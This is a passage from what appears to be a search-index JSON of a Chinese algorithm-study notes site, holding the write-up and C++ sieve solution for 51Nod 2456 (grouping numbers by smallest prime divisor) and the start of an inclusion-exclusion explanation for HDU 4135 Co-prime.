\u590d\u6742\u5ea6\uff0c\u6240\u4ee5\u548c\u641c\u7d22\u52a0\u8d77\u6765\u603b\u5171\u4e5f\u5c31\u4e00\u767e\u591a\u4e07\u6b21\u8fd0\u7b97\u3002\u53c2\u8003\u4e00\u53f0\u666e\u901a\u7684\u7b14\u8bb0\u672c\u7535\u81111\u79d2\u5927\u69821\u5343\u4e07\u6b21\u7684\u8fd0\u7b97\u901f\u5ea6\uff0c\u6211\u4eec\u662f\u53ef\u4ee5\u57281\u79d2\u4ee5\u5185\u5b8c\u6210\u66b4\u529b\u641c\u7d22\u8fc7\u7a0b\u7684\u3002 \u4e0b\u9762\u5bf9\u57c3\u6c0f\u7b5b\u7b97\u6cd5\u505a\u7b80\u5355\u7684\u8bf4\u660e\uff0c\u8fd9\u4e2a\u7b97\u6cd5\u53ef\u4ee5\u5feb\u901f\u627e\u5230 [2, n] \u4ee5\u5185\u7684\u8d28\u6570\u3002\u5bf9\u4e8e\u521d\u59cb\u961f\u5217 \\{1, 2, 3, \\dots n \\} \uff0c\u64cd\u4f5c\u6b65\u9aa4\u5982\u4e0b 1 \u8f93\u51fa\u6700\u5c0f\u7684\u7d20\u65702\uff0c\u7136\u540e\u7b5b\u63892\u7684\u500d\u6570\uff0c\u5269\u4e0b \\{ 3, 5, 7, 9, 11, 13\\dots \\} \u8f93\u51fa\u6700\u5c0f\u7684\u8d28\u65703\uff0c\u7136\u540e\u7b5b\u63893\u7684\u500d\u6570\uff0c\u5269\u4e0b \\{5, 7, 11, 13\\dots \\} \u8f93\u51fa\u6700\u5c0f\u7684\u8d28\u65705\uff0c\u7136\u540e\u7b5b\u63895\u7684\u500d\u6570\uff0c\u5269\u4e0b \\{ 7, 11, 13\\dots \\} \u7ee7\u7eed\u4ee5\u4e0a\u7684\u6b65\u9aa4\uff0c\u76f4\u5230\u961f\u5217\u4e3a\u7a7a \u7136\u540e\u8003\u8651\u5206\u7ec4\u6392\u5e8f\u8f93\u51fa\u7684\u95ee\u9898\u3002 \u6211\u4f7f\u7528\u7684\u662f map<int, multiset<int>> \u6765\u5b58\u50a8\u7ed3\u679c\uff0c\u56e0\u4e3a map \u80fd\u5bf9 key \u4e5f\u5c31\u662f\u6700\u5c0f\u7ea6\u6570\u8fdb\u884c\u6392\u5e8f\uff0c\u800c set \u80fd\u5bf9\u503c\u6392\u5e8f\uff0c\u8003\u8651\u5230\u503c\u53ef\u80fd\u91cd\u590d\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u662f\u53ef\u5b58\u50a8\u91cd\u590d\u9879\u7684 multiset \u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <map> #include <set> #include <string.h> using namespace std; const int MAXN = 1e4; // \u5b58\u50a8\u7d20\u6570 int prime[MAXN + 1]; // \u6807\u8bb0\u8bbf\u95ee bool visit[MAXN + 1]; // \u5206\u7c7b\u5b58\u50a8 map<int, multiset<int>> mp; // \u57c3\u6c0f\u7b5b\u6cd5\uff0c\u8ba1\u7b97[2, n]\u5185\u7684\u7d20\u6570 int E_sieve(int n) { // \u521d\u59cb\u5316 memset(visit, 0, sizeof(visit)); // \u7b5b\u6389\u975e\u7d20\u6570 for (int i = 2; i * i <= n; i++) { if (!visit[i]) { for (int j = i * i; j <= n; j += i) { // \u6807\u8bb0\u4e3a\u975e\u7d20\u6570 visit[j] = true; } } } // \u4e0b\u9762\u8bb0\u5f55\u7d20\u6570 // \u7edf\u8ba1\u7d20\u6570\u7684\u4e2a\u6570 int k = 0; for (int i = 2; i <= n; i++) { if (!visit[i]) { prime[k++] = i; } } return k; } int main() { // \u8ba1\u7b971e4\u4ee5\u5185\u7684\u7d20\u6570 int primeMark = E_sieve(MAXN); // test case int t; scanf(\"%d\", &t); // buffer int buffer; // \u5faa\u73af for (int i = 0; i < t; i++) { // \u8f93\u5165 scanf(\"%d\", &buffer); // \u627e\u5230\u5176\u8d28\u6570\u5206\u89e3\u540e\uff0c\u96641\u4ee5\u5916\u7684\u7684\u6700\u5c0f\u8d28\u6570 int j = 0; // \u82e5\u8d28\u6570\u5c0f\u4e8ebuffer while (prime[j] <= buffer && j < primeMark) { // \u627e\u5230\u7684\u7b2c\u4e00\u4e2a\u8d28\u6570 if (buffer % prime[j] == 0) { if (mp.find(prime[j]) != mp.end()) { // \u82e5\u5df2\u5b58\u50a8\u8fc7 mp[prime[j]].insert(buffer); } else { // \u82e5\u672a\u5b58\u50a8\u8fc7 multiset<int> st; st.insert(buffer); mp[prime[j]] = st; } // \u9000\u51fa\u5faa\u73af break; } j++; } } // \u8f93\u51fa for (auto it = mp.begin(); it != mp.end(); it++) { printf(\"%d \", it->first); for (auto itSet = it->second.begin(); itSet != it->second.end(); itSet++) { printf(\"%d \", *itSet); } printf(\"\\n\"); } return 0; } 4. \u53c2\u8003\u6587\u732e # [1] \u7f57\u52c7\u519b, \u90ed\u536b\u658c. \u7b97\u6cd5\u7ade\u8d5b\u5165\u95e8\u5230\u8fdb\u9636 [M]. \u5317\u4eac: \u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e, 2019. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.51Nod 2456 \u6700\u5c0f\u7ea6\u6570 V2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#51nod-2456-v2","text":"","title":"51Nod 2456 \u6700\u5c0f\u7ea6\u6570 V2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#_1","text":"51Nod 2456 \u6700\u5c0f\u7ea6\u6570 V2 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 4. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#12-problem-description","text":"\u7ed9\u51fa n \u4e2a\u6570\uff0c\u5c06\u8fd9\u4e2a n \u6570\u8fdb\u884c\u5206\u7ec4\uff0c\u5206\u7ec4\u89c4\u5219\u4e3a\uff1a\u9664\u4e861\u4ee5\u5916\u6700\u5c0f\u7684\u7ea6\u6570\u76f8\u540c\u7684\u6570\u5b57\u5206\u4e3a\u4e00\u7ec4\u3002\u6700\u540e\uff0c\u8f93\u51fa\u8fd9\u4e2a\u6700\u5c0f\u7ea6\u6570\uff0c\u540c\u65f6\u6309\u7167\u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\u9010\u4e00\u8f93\u51fa\u8fd9\u4e9b\u6570\u5b57\u3002 \u4f8b\u5982\uff1a7\u4e2a\u6570\uff0c35 8 39 12 8 26 25 \u8f93\u51fa\u4e3a\uff1a 2 8 8 12 26\uff08 [8, 8, 12, 26] \u4e3a\u7ed9\u5b9a\u76847\u4e2a\u6570\u4e2d\uff0c\u4ee52\u4e3a\u6700\u5c0f\u7ea6\u6570\uff08\u96641\u4ee5\u5916\uff09\u7684\u6570\uff09 3 39\uff08 [39] \u4e3a\u7ed9\u5b9a\u76847\u4e2a\u6570\u4e2d\uff0c\u4ee53\u4e3a\u6700\u5c0f\u7ea6\u6570\uff08\u96641\u4ee5\u5916\uff09\u7684\u6570\uff09 5 25 35\uff08 [25\uff0c 35] \u4e3a\u7ed9\u5b9a\u76847\u4e2a\u6570\u4e2d\uff0c\u4ee55\u4e3a\u6700\u5c0f\u7ea6\u6570\uff08\u96641\u4ee5\u5916\uff09\u7684\u6570\uff09","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#13-input","text":"\u7b2c\u4e00\u884c\uff1a1\u4e2a\u6570 n\uff08n \\le 1000\uff09 \u540e\u9762 n \u884c\uff0c\u6bcf\u884c1\u4e2a\u6570 a[i]\uff082 <= a[i] <= 10000\uff09","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#14-output","text":"\u6309\u7167\u7ea6\u6570 d \u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\uff0c\u9010\u884c\u8f93\u51fa\u6240\u6709\u6700\u5c0f\u7ea6\u6570\uff08\u9664\u4e861\u4e4b\u5916\u7684\uff09\u4e3a d \u7684\u6570\u5b57\uff0c\u5e76\u4e14\u6bcf\u884c\u4e2d\u8f93\u51fa\u6570\u5b57\u7684\u987a\u5e8f\u4e5f\u662f\u4ece\u5c0f\u5230\u5927\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#15-sample-input","text":"7 35 8 39 12 8 26 25","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#16-sample-output","text":"2 8 8 12 26 3 39 5 25 35","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#17-source","text":"51Nod 2456 \u6700\u5c0f\u7ea6\u6570 V2","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#2","text":"\u8fd9\u9053\u9898\u6709\u4e24\u4e2a\u90e8\u5206\u9700\u8981\u5b8c\u6210 \u5206\u89e3\u6700\u5c0f\u7ea6\u6570 \u5206\u7ec4\u6392\u5e8f\u8f93\u51fa \u9996\u5148\u6211\u4eec\u8003\u8651\u5206\u89e3\u6700\u5c0f\u7ea6\u6570\u7684\u95ee\u9898\u3002 \u7ed9\u5b9a\u4e00\u4e2a\u6570 x \uff0c\u8981\u627e\u5230\u5176\u9664\u4e861\u4ee5\u5916\u6700\u5c0f\u7684\u7ea6\u6570 d \uff0c\u4ee5\u6b64\u53ef\u4ee5\u63a8\u65ad\u6211\u4eec\u8981\u627e\u7684\u8fd9\u4e2a\u7ea6\u6570\u80af\u5b9a\u662f\u4e00\u4e2a\u8d28\u6570\uff0c\u56e0\u4e3a\u5982\u679c d \u4e0d\u662f\u4e00\u4e2a\u8d28\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5bf9\u5176\u518d\u505a\u4e00\u6b21\u8d28\u6570\u5206\u89e3\uff0c\u5c31\u53ef\u4ee5\u6c42\u5f97\u6bd4\u5b83\u66f4\u5c0f\u7684\u4e00\u4e2a\u7ea6\u6570\u3002 \u660e\u786e\u4e86\u6211\u4eec\u8981\u627e\u7684\u6570\u662f\u4e00\u4e2a\u8d28\u6570\u4ee5\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5728\u6c42\u51fa\u8d28\u6570\u8868\u4ee5\u540e\u7528\u66b4\u529b\u641c\u7d22\u7684\u65b9\u6cd5\u6765\u6c42\u89e3\u3002\u7ed3\u5408\u8fd9\u9053\u9898\u7684\u6570\u636e\u8303\u56f4 [1, 10000] \u8003\u8651\uff0c\u5728\u8fd9\u4e2a\u8303\u56f4\u91cc\u9762\u53ea\u67091229\u4e2a\u8d28\u6570\uff0c\u800c\u8f93\u5165\u4e5f\u6700\u591a\u53ea\u67091000\u4e2a\u6570\uff0c 1229 \\times 1000 = 1.229 \\times 10 ^6 \uff0c\u4e5f\u5c31\u662f\u8bf4\u5728\u6c42\u51fa\u4e00\u4e07\u4ee5\u5185\u7684\u8d28\u6570\u4ee5\u540e\uff0c\u6211\u4eec\u6700\u591a\u53ea\u8981\u518d\u505a100\u591a\u4e07\u6b21\u8fd0\u7b97\u5c31\u80fd\u6c42\u51fa\u7ed3\u679c\u3002 \u800c\u6211\u4eec\u4f7f\u7528\u7684\u6c42\u8d28\u6570\u7684\u57c3\u6c0f\u7b5b\u7b97\u6cd5\u7684\u590d\u6742\u5ea6\u4e5f\u662f O(n \\log\\log n) \u7684\uff0c\u63a5\u8fd1 O(n) \u590d\u6742\u5ea6\uff0c\u6240\u4ee5\u548c\u641c\u7d22\u52a0\u8d77\u6765\u603b\u5171\u4e5f\u5c31\u4e00\u767e\u591a\u4e07\u6b21\u8fd0\u7b97\u3002\u53c2\u8003\u4e00\u53f0\u666e\u901a\u7684\u7b14\u8bb0\u672c\u7535\u81111\u79d2\u5927\u69821\u5343\u4e07\u6b21\u7684\u8fd0\u7b97\u901f\u5ea6\uff0c\u6211\u4eec\u662f\u53ef\u4ee5\u57281\u79d2\u4ee5\u5185\u5b8c\u6210\u66b4\u529b\u641c\u7d22\u8fc7\u7a0b\u7684\u3002 \u4e0b\u9762\u5bf9\u57c3\u6c0f\u7b5b\u7b97\u6cd5\u505a\u7b80\u5355\u7684\u8bf4\u660e\uff0c\u8fd9\u4e2a\u7b97\u6cd5\u53ef\u4ee5\u5feb\u901f\u627e\u5230 [2, n] \u4ee5\u5185\u7684\u8d28\u6570\u3002\u5bf9\u4e8e\u521d\u59cb\u961f\u5217 \\{1, 2, 3, \\dots n \\} \uff0c\u64cd\u4f5c\u6b65\u9aa4\u5982\u4e0b 1 \u8f93\u51fa\u6700\u5c0f\u7684\u7d20\u65702\uff0c\u7136\u540e\u7b5b\u63892\u7684\u500d\u6570\uff0c\u5269\u4e0b \\{ 3, 5, 7, 9, 11, 13\\dots \\} \u8f93\u51fa\u6700\u5c0f\u7684\u8d28\u65703\uff0c\u7136\u540e\u7b5b\u63893\u7684\u500d\u6570\uff0c\u5269\u4e0b \\{5, 7, 11, 13\\dots \\} \u8f93\u51fa\u6700\u5c0f\u7684\u8d28\u65705\uff0c\u7136\u540e\u7b5b\u63895\u7684\u500d\u6570\uff0c\u5269\u4e0b \\{ 7, 11, 13\\dots \\} \u7ee7\u7eed\u4ee5\u4e0a\u7684\u6b65\u9aa4\uff0c\u76f4\u5230\u961f\u5217\u4e3a\u7a7a \u7136\u540e\u8003\u8651\u5206\u7ec4\u6392\u5e8f\u8f93\u51fa\u7684\u95ee\u9898\u3002 \u6211\u4f7f\u7528\u7684\u662f map<int, multiset<int>> \u6765\u5b58\u50a8\u7ed3\u679c\uff0c\u56e0\u4e3a map \u80fd\u5bf9 key \u4e5f\u5c31\u662f\u6700\u5c0f\u7ea6\u6570\u8fdb\u884c\u6392\u5e8f\uff0c\u800c set \u80fd\u5bf9\u503c\u6392\u5e8f\uff0c\u8003\u8651\u5230\u503c\u53ef\u80fd\u91cd\u590d\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u662f\u53ef\u5b58\u50a8\u91cd\u590d\u9879\u7684 multiset \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#3","text":"#include <algorithm> #include <iostream> #include <map> #include <set> #include <string.h> using namespace std; const int MAXN = 1e4; // \u5b58\u50a8\u7d20\u6570 int prime[MAXN + 1]; // \u6807\u8bb0\u8bbf\u95ee bool visit[MAXN + 1]; // \u5206\u7c7b\u5b58\u50a8 map<int, multiset<int>> mp; // \u57c3\u6c0f\u7b5b\u6cd5\uff0c\u8ba1\u7b97[2, n]\u5185\u7684\u7d20\u6570 int E_sieve(int n) { // \u521d\u59cb\u5316 memset(visit, 0, sizeof(visit)); // \u7b5b\u6389\u975e\u7d20\u6570 for (int i = 2; i * i <= n; i++) { if (!visit[i]) { for (int j = i * i; j <= n; j += i) { // \u6807\u8bb0\u4e3a\u975e\u7d20\u6570 visit[j] = true; } } } // \u4e0b\u9762\u8bb0\u5f55\u7d20\u6570 // \u7edf\u8ba1\u7d20\u6570\u7684\u4e2a\u6570 int k = 0; for (int i = 2; i <= n; i++) { if (!visit[i]) { prime[k++] = i; } } return k; } int main() { // \u8ba1\u7b971e4\u4ee5\u5185\u7684\u7d20\u6570 int primeMark = E_sieve(MAXN); // test case int t; scanf(\"%d\", &t); // buffer int buffer; // \u5faa\u73af for (int i = 0; i < t; i++) { // \u8f93\u5165 scanf(\"%d\", &buffer); // \u627e\u5230\u5176\u8d28\u6570\u5206\u89e3\u540e\uff0c\u96641\u4ee5\u5916\u7684\u7684\u6700\u5c0f\u8d28\u6570 int j = 0; // \u82e5\u8d28\u6570\u5c0f\u4e8ebuffer while (prime[j] <= buffer && j < primeMark) { // \u627e\u5230\u7684\u7b2c\u4e00\u4e2a\u8d28\u6570 if (buffer % prime[j] == 0) { if (mp.find(prime[j]) != mp.end()) { // \u82e5\u5df2\u5b58\u50a8\u8fc7 mp[prime[j]].insert(buffer); } else { // \u82e5\u672a\u5b58\u50a8\u8fc7 multiset<int> st; st.insert(buffer); mp[prime[j]] = st; } // \u9000\u51fa\u5faa\u73af break; } j++; } } // \u8f93\u51fa for (auto it = mp.begin(); it != mp.end(); it++) { printf(\"%d \", it->first); for (auto itSet = it->second.begin(); itSet != it->second.end(); itSet++) { printf(\"%d \", *itSet); } printf(\"\\n\"); } return 0; }","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/#4","text":"[1] \u7f57\u52c7\u519b, \u90ed\u536b\u658c. \u7b97\u6cd5\u7ade\u8d5b\u5165\u95e8\u5230\u8fdb\u9636 [M]. \u5317\u4eac: \u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e, 2019. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4. \u53c2\u8003\u6587\u732e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/","text":"HDU 4135 Co-prime # \u76ee\u5f55 # HDU 4135 Co-prime \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 4. \u53c2\u8003\u6587\u732e 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 32768 kB 1.2. Problem Description # Given a number N , you are asked to count the number of integers between A and B inclusive which are relatively prime to N . Two integers are said to be co-prime or relatively prime if they have no common positive divisors other than 1 or, equivalently, if their greatest common divisor is 1. The number 1 is relatively prime to every integer. 1.3. Input # The first line on input contains T (0 < T \\le 100) the number of test cases, each of the next T lines contains three integers A, B, N where (1 \\le A \\le B \\le 10^{15}) and (1 \\le N \\le 10^{9}) . 1.4. Output # For each test case, print the number of integers between A and B inclusive which are relatively prime to N. Follow the output format below. 1.5. Sample Input # 2 1 10 2 3 15 5 1.6. Sample Output # Case #1: 5 Case #2: 10 In the first test case, the five integers in range [1,10] which are relatively prime to 2 are {1,3,5,7,9} . 1.7. Source # The Third Lebanese Collegiate Programming Contest 2. \u89e3\u8bfb # \u8fd9\u9053\u9898\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5230\u7684\u662f \u5bb9\u65a5\u539f\u7406 \u3002 \u5bb9\u65a5\u539f\u7406\u5206\u4e3a\u4e09\u79cd\u5b9e\u73b0 1 \uff1a 1.\u4f4d\u8fd0\u7b97\u4e0e\u4e8c\u8fdb\u5236\u679a\u4e3e\uff08\u5bb9\u6613\u7406\u89e3\uff09 2.\u961f\u5217\u6570\u7ec4\uff08\u8017\u65f6\u6700\u77ed\uff09 3.\u9012\u5f52\uff08\u4ee3\u7801\u6700\u77ed\u4f46\u4e0d\u5bb9\u6613\u7406\u89e3\uff09 \u5728\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8ba8\u8bba\u6bd4\u8f83\u597d\u7406\u89e3\u7684 \u4f4d\u8fd0\u7b97\u4e0e\u4e8c\u8fdb\u5236\u679a\u4e3e \u65b9\u6cd5\uff0c\u5176\u4ed6\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u53c2\u8003 \u6df1\u6d77\u6ca7\u6f9c\u591c\u672a\u592e\u7684\u535a\u5ba2 2 \u3002 \u9996\u5148\u5206\u6790\u95ee\u9898\uff0c\u6211\u4eec\u8981\u6c42\u7684\u662f\u533a\u95f4 [A, B] \u4e4b\u5185 \u548c N \u4e92\u8d28\u7684\u6570\u7684\u4e2a\u6570\uff0c\u8003\u8651\u9053\u9898\u76ee\u4e2d\u7684\u8303\u56f4 1 \\le A \\le B \\le 10^{15} \uff0c\u66b4\u529b\u7b97\u6cd5\u662f\u4e0d\u592a\u53ef\u80fd\u4e86\u3002 \u800c\u5728 \u4e4b\u524d\u7684\u4e00\u7bc7\u7b14\u8bb0\u4e2d \uff0c\u6211\u4eec\u63d0\u5230\u4e86\u7528\u57c3\u6c0f\u7b5b\u6cd5\u6765\u6c42 [2, n] \u8303\u56f4\u5185\u7684\u6240\u6709\u8d28\u6570\uff0c\u4e3b\u8981\u601d\u60f3\u662f\u4e0d\u65ad\u7b5b\u9664 [2, n] \u4e2d\u7684\u975e\u8d28\u6570\u548c\u5b83\u7684\u500d\u6570\uff0c\u76f4\u5230\u5217\u8868\u5185\u53ea\u5269\u4e0b\u8d28\u6570\u4e3a\u6b62\u3002\u4e5f\u5c31\u662f\u8bf4\u7b5b\u9664\u6389\u4e00\u4e2a\u533a\u95f4\u5185\u7684\u975e\u8d28\u6570\u662f\u6bd4\u8f83\u9ad8\u6548\u7684\u3002 \u987a\u7740\u8fd9\u4e2a\u601d\u8def\u6211\u4eec\u5c31\u53ef\u4ee5\u60f3\u5230\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u51fa\u533a\u95f4 [2, A - 1] \u4e4b\u5185\u548c N \u4e0d\u4e92\u8d28\u7684\u6570\u7684\u6570\u91cf w_{A - 1} \u548c \u533a\u95f4 [2, B] \u4e4b\u5185\u548c N \u4e0d\u4e92\u8d28\u7684\u6570\u7684\u6570\u91cf w_B \uff0c\u8ba1\u7b97 (B - w_B) - (A - 1- w_{A - 1}) \u5c31\u53ef\u4ee5\u6c42\u51fa\u7b54\u6848\u4e86\u3002 \u90a3\u4e48\uff0c\u6211\u4eec\u8981\u600e\u4e48\u6c42\u51fa w_{A - 1} \u548c w_B \u5462\uff0c\u4e0d\u9700\u8981\u4e00\u4e2a\u4e2a\u53bb\u7b5b\u9664\u90a3\u4e48\u9ebb\u70e6\uff0c\u53ea\u9700\u8981\u6c42\u51fa N \u7684\u6240\u6709\u8d28\u56e0\u6570 p_i \uff0c\u5f62\u6210\u4e00\u4e2a\u96c6\u5408 P \uff0c\u628a [2, A - 1] \u548c [2, B] \u4e2d\u6240\u6709 P \u7684\u500d\u6570\u7684\u6570\u91cf\u6c42\u51fa\u6765\u5e76\u51cf\u53bb\u5c31\u53ef\u4ee5\u4e86\u3002 \u5982\u679c P \u96c6\u5408\u4e2d\u53ea\u6709\u4e00\u4e2a\u6570 p_1 \uff0c\u6211\u4eec\u53ea\u9700\u8981\u8fd9\u6837\u8ba1\u7b97\u5c31\u53ef\u4ee5\u4e86 w_{A - 1} = \\lfloor \\frac{A - 1}{p_1} \\rfloor w_B = \\lfloor \\frac{B}{p_1} \\rfloor \u4f46\u5f88\u660e\u663e P \u96c6\u5408\u4e2d\u5f88\u53ef\u80fd\u4e0d\u4ec5\u4ec5\u53ea\u6709\u4e00\u4e2a\u6570\uff0c\u8fd9\u91cc\u5c31\u6d89\u53ca\u5230 \u5bb9\u65a5\u539f\u7406 \u4e86\u3002 \u5047\u8bbe P = \\{2, 3, 5\\} \uff0c A = 30 \uff0c B = 60 \uff0c\u90a3\u4e48\u8ba1\u7b97\u516c\u5f0f\u5982\u4e0b { \\begin{aligned} w_{A - 1} =& {\\lfloor \\frac{A - 1}{2} \\rfloor} + {\\lfloor \\frac{A - 1}{3} \\rfloor} + {\\lfloor \\frac{A - 1}{5} \\rfloor} - {\\lfloor \\frac{A - 1}{2 \\times 3} \\rfloor} - {\\lfloor \\frac{A - 1}{3 \\times 5} \\rfloor} & \\\\ &{ - \\lfloor \\frac{A - 1}{2 \\times 5} \\rfloor} + {\\lfloor \\frac{A - 1}{2 \\times 3 \\times 5} \\rfloor} &\\\\ =& 14 + 9 + 5 - 4 - 1 - 2 + 0 &\\\\ =& 21 &\\\\ \\end{aligned} } { \\begin{aligned} w_B =& {\\lfloor \\frac{B}{2} \\rfloor} + {\\lfloor \\frac{B}{3} \\rfloor} + {\\lfloor \\frac{B}{5} \\rfloor} - {\\lfloor \\frac{B}{2 \\times 3} \\rfloor} - {\\lfloor \\frac{B}{3 \\times 5} \\rfloor} & \\\\ &{ - \\lfloor \\frac{B}{2 \\times 5} \\rfloor} + {\\lfloor \\frac{B}{2 \\times 3 \\times 5} \\rfloor} &\\\\ =& 30 + 20 + 12 - 10 - 4 - 6 + 2 &\\\\ =& 44 &\\\\ \\end{aligned} } ans = (B - w_B) - (A - 1 - w_{A - 1}) = 8 \u8fd9\u91cc\u53c8\u6d89\u53ca\u5230 \u5bb9\u65a5\u539f\u7406 \u4e2d\u4e00\u4e2a \u5947\u52a0\u5076\u51cf \u7684\u89c4\u5f8b\uff0c\u4e5f\u5c31\u662f\u5728\u8fed\u4ee3\u8ba1\u7b97\u7684\u8fc7\u7a0b\u4e2d w_{B} \u8981\u52a0\u4e0a B \u9664\u4ee5 \u5947\u6570\u4e2a\u8d28\u56e0\u6570 \u76f8\u4e58\u6240\u5f97\u7684\u7ed3\u679c\uff0c\u51cf\u53bb B \u9664\u4ee5 \u5076\u6570\u4e2a\u8d28\u56e0\u6570 \u76f8\u4e58\u6240\u5f97\u7684\u7ed3\u679c\u3002 \u53c8\u6709\u95ee\u9898\u51fa\u73b0\u4e86\uff0c\u6211\u4eec\u8981\u600e\u4e48\u904d\u5386\u6240\u6709\u7ec4\u5408\u7684\u60c5\u51b5\u5462\uff1f \u5728\u6700\u5f00\u59cb\u63d0\u5230\u7684 \u4f4d\u8fd0\u7b97\u4e0e\u4e8c\u8fdb\u5236\u679a\u4e3e \u65b9\u6cd5\u95ea\u4eae\u767b\u573a\u3002\u8fd8\u662f\u5047\u8bbe P = \\{2, 3, 5\\} \uff0c\u628a P \u7684\u7ec4\u5408\u60c5\u51b5 